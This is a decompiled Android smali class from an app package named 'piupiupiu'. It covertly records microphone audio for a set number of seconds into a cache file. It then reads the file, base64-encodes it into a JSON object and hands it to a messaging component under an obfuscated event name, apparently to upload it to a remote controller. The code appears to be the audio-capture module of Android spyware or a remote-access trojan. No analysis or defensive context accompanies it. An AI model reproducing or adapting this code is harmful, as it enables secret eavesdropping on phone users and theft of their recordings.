.class public Lcom/piupiupiu/h;
.super Ljava/lang/Object;


# static fields
.field static a:Landroid/media/MediaRecorder;

.field static b:Ljava/io/File;

.field static c:Ljava/util/TimerTask;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const/4 v0, 0x0

    sput-object v0, Lcom/piupiupiu/h;->b:Ljava/io/File;

    return-void
.end method

.method public static a(I)V
    .locals 4

    invoke-static {}, Lcom/piupiupiu/CoreService;->a()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Context;->getCacheDir()Ljava/io/File;

    move-result-object v0

    :try_start_0
    const-string v1, "DIRR"

    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    const-string v1, "sound"

    const-string v2, ".mp3"

    invoke-static {v1, v2, v0}, Ljava/io/File;->createTempFile(Ljava/lang/String;Ljava/lang/String;Ljava/io/File;)Ljava/io/File;

    move-result-object v0

    sput-object v0, Lcom/piupiupiu/h;->b:Ljava/io/File;
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    new-instance v0, Landroid/media/MediaRecorder;

    invoke-direct {v0}, Landroid/media/MediaRecorder;-><init>()V

    sput-object v0, Lcom/piupiupiu/h;->a:Landroid/media/MediaRecorder;

    sget-object v0, Lcom/piupiupiu/h;->a:Landroid/media/MediaRecorder;

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/media/MediaRecorder;->setAudioSource(I)V

    sget-object v0, Lcom/piupiupiu/h;->a:Landroid/media/MediaRecorder;

    const/4 v1, 0x2

    invoke-virtual {v0, v1}, Landroid/media/MediaRecorder;->setOutputFormat(I)V

    sget-object v0, Lcom/piupiupiu/h;->a:Landroid/media/MediaRecorder;

    const/4 v1, 0x3

    invoke-virtual {v0, v1}, Landroid/media/MediaRecorder;->setAudioEncoder(I)V

    sget-object v0, Lcom/piupiupiu/h;->a:Landroid/media/MediaRecorder;

    sget-object v1, Lcom/piupiupiu/h;->b:Ljava/io/File;

    invoke-virtual {v1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/media/MediaRecorder;->setOutputFile(Ljava/lang/String;)V

    sget-object v0, Lcom/piupiupiu/h;->a:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->prepare()V

    sget-object v0, Lcom/piupiupiu/h;->a:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->start()V

    new-instance v0, Lcom/piupiupiu/h$1;

    invoke-direct {v0}, Lcom/piupiupiu/h$1;-><init>()V

    sput-object v0, Lcom/piupiupiu/h;->c:Ljava/util/TimerTask;

    new-instance v0, Ljava/util/Timer;

    invoke-direct {v0}, Ljava/util/Timer;-><init>()V

    sget-object v1, Lcom/piupiupiu/h;->c:Ljava/util/TimerTask;

    mul-int/lit16 v2, p0, 0x3e8

    int-to-long v2, v2

    invoke-virtual {v0, v1, v2, v3}, Ljava/util/Timer;->schedule(Ljava/util/TimerTask;J)V

    :goto_0
    return-void

    :catch_0
    move-exception v0

    const-string v0, "MediaRecording"

    const-string v1, "external storage access error"

    invoke-static {v0, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_0
.end method

.method static synthetic a(Ljava/io/File;)V
    .locals 0

    invoke-static {p0}, Lcom/piupiupiu/h;->b(Ljava/io/File;)V

    return-void
.end method

.method private static b(Ljava/io/File;)V
    .locals 5

    invoke-virtual {p0}, Ljava/io/File;->length()J

    move-result-wide v0

    long-to-int v0, v0

    new-array v0, v0, [B

    :try_start_0
    new-instance v1, Ljava/io/BufferedInputStream;

    new-instance v2, Ljava/io/FileInputStream;

    invoke-direct {v2, p0}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    invoke-direct {v1, v2}, Ljava/io/BufferedInputStream;-><init>(Ljava/io/InputStream;)V

    const/4 v2, 0x0

    array-length v3, v0

    invoke-virtual {v1, v0, v2, v3}, Ljava/io/BufferedInputStream;->read([BII)I

    new-instance v2, Lorg/json/JSONObject;

    invoke-direct {v2}, Lorg/json/JSONObject;-><init>()V

    const-string v3, "file"

    const/4 v4, 0x1

    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    const-string v3, "name"

    invoke-virtual {p0}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v3, "buffer"

    const/4 v4, 0x0

    invoke-static {v0, v4}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v3, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-static {}, Lcom/piupiupiu/f;->a()Lcom/piupiupiu/f;

    move-result-object v0

    const-string v3, "w8k3qu"

    invoke-virtual {v0, v3, v2}, Lcom/piupiupiu/f;->a(Ljava/lang/String;Ljava/lang/Object;)V

    invoke-virtual {v1}, Ljava/io/BufferedInputStream;->close()V
    :try_end_0
    .catch Ljava/io/FileNotFoundException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_2

    :goto_0
    return-void

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/io/FileNotFoundException;->printStackTrace()V

    goto :goto_0

    :catch_1
    move-exception v0

    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_0

    :catch_2
    move-exception v0

    invoke-virtual {v0}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_0
.end method
